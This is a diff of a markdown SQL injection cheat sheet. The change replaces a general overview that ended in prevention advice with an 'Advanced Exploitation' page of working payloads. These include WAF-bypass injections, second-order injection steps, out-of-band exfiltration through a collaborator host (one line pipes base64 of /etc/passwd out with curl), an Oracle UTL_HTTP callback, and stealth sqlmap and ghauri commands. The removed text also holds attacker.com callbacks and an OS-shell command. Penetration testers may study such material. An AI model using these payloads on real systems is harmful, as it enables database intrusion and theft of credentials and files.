@@ -1,141 +1,72 @@
-# SQL Injection (SQLi)
+# SQL Injection: Advanced Exploitation
 
-SQL injection occurs when user input is incorporated into SQL queries without proper sanitization or parameterization, allowing an attacker to manipulate the query logic.
+## Blind SQLi With WAF Bypass
 
-## Types of SQL Injection
-
-### 1. In-band SQLi (Error-based & Union-based)
-
-**Error-based:** Extract data through database error messages.
+### Time-Based Detection Through WAFs
 ```sql
-' AND 1=CONVERT(int, (SELECT @@version))--
-' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables--
+-- Bypass SLEEP keyword filter
+AND (SELECT * FROM (SELECT(SLEEP(5)))a)
+AND BENCHMARK(5000000, MD5('test'))
+AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B) -- Heavy query
 ```
 
-**Union-based:** Use UNION to combine results.
+### Comment & Whitespace Bypasses
 ```sql
-' ORDER BY 1--  (determine column count)
-' UNION SELECT 1,2,3,4,5--  (test column positions)
-' UNION SELECT 1,2,3,4,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,3,4,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT 1,2,3,4,group_concat(username,0x3a,password) FROM users--
+'/**/OR/**/1=1-- -
+'%0AOR%0A1=1-- -
+'/*!50000OR*/1=1-- -
+'||'1'='1          -- PostgreSQL/Oracle OR bypass
 ```
 
-### 2. Blind SQLi (Boolean & Time-based)
+## Second-Order SQL Injection
 
-**Boolean-based:** Infer truth from response differences.
-```
-' AND 1=1--  (true, normal response)
-' AND 1=2--  (false, different response)
-' AND SUBSTRING((SELECT @@version),1,1)='5'--
-```
+Insert payload into one feature, trigger in another:
+1. Register username: `' OR '1'='1' -- -`
+2. The username is stored safely (parameterized in insert)
+3. Admin tool retrieves username via `SELECT * FROM users WHERE username='$username'` — injection fires
 
-**Time-based:** Infer truth from response delay.
-```
-' IF (1=1) WAITFOR DELAY '0:0:5'--  (SQL Server)
-' AND SLEEP(5)--  (MySQL)
-' AND pg_sleep(5)--  (PostgreSQL)
-```
+**Where to look:** Newsletter signups, profile names that appear in admin panels, referral codes displayed on dashboards.
 
-### 3. Out-of-band SQLi
+## OOB SQLi Exfiltration
 
-Data exfiltrated through DNS/HTTP to attacker-controlled server.
+When data cannot be retrieved in-band or through errors:
+
+### MySQL OOB (LOAD_FILE + UNC)
 ```sql
-' EXEC master..xp_dirtree '//attacker.com/table'--  (SQL Server)
-' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.attacker.com\\test'))--  (MySQL)
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.collaborator.oastify.com\\test'))-- -
 ```
 
-## Database-Specific Techniques
-
-### MySQL
+### MSSQL OOB (xp_dirtree)
 ```sql
-' UNION SELECT 1,@@version,3,4,5--  (version)
-' UNION SELECT 1,user(),3,4,5--  (current user)
-' UNION SELECT 1,database(),3,4,5--  (current DB)
--- Comment: --, #, /*!
--- Unique: INTO OUTFILE, LOAD_FILE, INTO DUMPFILE
+'; EXEC master..xp_dirtree '\\collaborator.oastify.com\share'-- -
+-- No privileges required for DNS callback
+'; DECLARE @v VARCHAR(8000); SELECT @v=@@version; EXEC('master..xp_dirtree ''\\'+@v+'.collaborator.oastify.com\test'';')-- -
 ```
 
-### PostgreSQL
+### PostgreSQL OOB (COPY TO PROGRAM)
 ```sql
-' UNION SELECT 1,version(),3--
-' UNION SELECT 1,current_database(),3--
-' UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables--
--- Comment: --, /*
--- Unique: CAST, XML functions (query_to_xml)
+'; COPY (SELECT version()) TO PROGRAM 'curl http://collaborator.oastify.com/?v=$(cat /etc/passwd|base64)'-- -
 ```
 
-### SQL Server
+### Oracle OOB (UTL_HTTP)
 ```sql
-' UNION SELECT 1,@@version,3,4--
-' UNION SELECT 1,db_name(),3,4--
-' UNION SELECT 1,STRING_AGG(table_name,','),3,4 FROM information_schema.tables--
--- Comment: --, /*, %00
--- Unique: xp_cmdshell (RCE), OPENROWSET, SELECT INTO OUTFILE
+'||(SELECT UTL_HTTP.REQUEST('http://collaborator.oastify.com/?v='||(SELECT user FROM dual)) FROM dual)||'
 ```
 
-### Oracle
-```sql
-' UNION SELECT '1','2' FROM dual--
-' UNION SELECT 1,(SELECT banner FROM v$version),3 FROM dual--
-' UNION SELECT 1,table_name,3 FROM all_tables--
--- Comment: --, /*, %00
--- Unique: FROM dual required, no LIMIT (use ROWNUM)
-```
+## Automation Strategy
 
-## WAF Bypass Techniques
-
-- **Case variation**: `UnIoN sElEcT`
-- **Comments**: `UN/**/ION SEL/**/ECT`
-- **Hex encoding**: `0x756e696f6e` = 'union'
-- **Double URL encoding**: `%2532%370`
-- **Null bytes**: `%00' UNION SELECT...`
-- **Buffer overflow**: `?id=1'+AND+1=1+AND+1=2` + junk
-- **HTTP Parameter Pollution**: `?id=1&id=2&id=3 UNION SELECT...`
-
-## Automation
-
-### sqlmap
 ```bash
-# Basic run
-sqlmap -u "https://target.com/page?id=1" --batch
-
-# With cookie/auth
-sqlmap -u "https://target.com/page?id=1" --cookie="session=abc" --batch
-
-# Get databases
-sqlmap -u "https://target.com/page?id=1" --dbs
-
-# Get tables
-sqlmap -u "https://target.com/page?id=1" -D dbname --tables
-
-# Dump data
-sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump
-
-# OS shell
-sqlmap -u "https://target.com/page?id=1" --os-shell
-
-# Request from file (Burp)
-sqlmap -r request.txt --batch
-
-# Level/Risk tuning
-sqlmap -u "https://target.com/page?id=1" --level=3 --risk=2
+# SQLMap with stealth
+sqlmap -r request.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3
+# Ghauri for WAF-heavy targets (cloudflare, akamai)
+ghauri -r request.txt --confirm --delay=2 --random-agent
 ```
 
-### NoSQLMap
+### ORM Injection Detection
 ```bash
-nosqlmap --url "https://target.com/api/login" -A login
+# Hibernate/Sequelize/JPA often accept raw query params
+# Test non-standard syntax that ORMs pass through
+'}; SELECT * FROM users;--
+'-- -
+' AND 1=CAST((SELECT 1) AS INT)--
 ```
-
-## Prevention Best Practices
-
-1. **Prepared statements / parameterized queries** (always)
-2. **Stored procedures** (safe if parameterized)
-3. **Input validation** (allow-list approach preferred)
-4. **Least privilege** — DB user should not have excessive permissions
-5. **WAF** — Defense in depth (not sole protection)
-6. **ORM frameworks** — Use safe ORM methods (avoid raw queries)
-
----
-
-> **Next**: [NoSQL Injection](04-nosql-injection.md)
